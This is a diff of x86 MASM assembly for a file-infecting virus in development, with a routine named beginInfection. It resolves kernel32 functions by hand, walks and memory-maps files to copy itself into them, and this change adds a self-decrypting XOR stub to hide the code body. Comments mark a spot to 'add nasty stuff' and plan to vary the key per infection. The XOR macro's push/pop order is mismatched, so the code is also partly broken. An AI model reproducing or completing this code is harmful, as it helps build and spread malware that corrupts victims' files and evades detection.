@@ -8,7 +8,7 @@ option casemap:none
       ;include user32.inc
 	  include kernel32.inc
 
-	  include handle_file.inc
+	  ;include handle_file.inc
 
 
       includelib user32.lib
@@ -19,11 +19,39 @@ option casemap:none
 
 .code
 
+APPLYXORVALUE	macro addrbegin, addrend, value
+
+	push esi
+	push ecx	
+	push eax
+
+	mov esi, addrbegin
+	mov ecx, addrend - addrbegin
+	xor eax, eax
+
+	.WHILE ecx > 0
+		
+		mov ah, byte ptr [esi]
+		xor eax, value
+		mov byte ptr [esi], ah
+
+		inc esi
+		dec ecx
+	.ENDW
+
+	pop eax
+	pop esi
+	pop ecx
+				endm
+
+
+
+
 main:
-
 	mov ebx, [esp]
-	jmp startinf
+	jmp crypted_code_end
 
+crypted_code_begin:
 loadproc	macro dest, hmodule, loadproc, strproc
 	push eax
 	push strproc
@@ -136,12 +164,6 @@ getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcN
 	jmp endfindprocfail
 
 endfindproc:
-COMMENT @
-	sub ebx, [eax].AddressOfNames
-	add ebx, [eax].AddressOfFunctions
-	mov eax, [ebx]			;; function's virtual address
-	add eax, PEBaseAddr
-	@
 
 	assume eax:nothing
 	mov		edx,			funcIndex		;; edx iterations
@@ -266,23 +288,22 @@ fileMainLoop:
 	rep movsb ;HOLY SH1T 1TS T34L
 
 	; fileView now points toward an array representing our file
+	; TODO : change the XOR value (label: crypt_key_value)
+	; XOR the content of fileview with the new value, between labels crypted_code_begin and crypted_code_end
+	; treatment is done !
 
-	;invoke prcUnmapViewOfFile, fileView
 	push fileView
 	call prcUnmapViewOfFile
 
 fileMapClose:
-	;invoke prcCloseHandle, fileMapping
 	push fileMapping
 	call prcCloseHandle
 
 fileClose:
-	;invoke prcCloseHandle, fileHandle
 	push fileHandle
 	call prcCloseHandle
 
 fileNext:
-	;invoke prcFindNextFile, searchHandle, addr findFileData
 	lea edi, findFileData
 	push edi
 	push searchHandle
@@ -292,7 +313,6 @@ fileNext:
 	jne fileMainLoop
 
 fileNoMore:
-	;invoke prcFindClose, searchHandle
 	push searchHandle
 	call prcFindClose
 
@@ -375,7 +395,7 @@ Kernel32Init:
 
 	invoke filesLoop, eax, procGetProcAddress, sectionSize
 
-
+	; TODO : this is were we add nasty stuff
 
 	ret
 beginInfection endp
@@ -387,7 +407,23 @@ startinf:
 	xor eax, eax
 	;invoke extractKernel32PEHeader, ebx
 	invoke beginInfection, ebx
+	jmp final_return
 
+crypted_code_end:
+	jmp start_uncrypt
+crypt_key_value:
+	CKV db 0	
+
+start_uncrypt:
+	mov eax, crypt_key_value
+	mov ecx, crypted_code_begin
+	APPLYXORVALUE crypted_code_begin, crypted_code_end, eax
+
+unencrypt_loop:
+	
+	jmp startinf
+
+final_return:
 	ret
 endfile:
 end	main
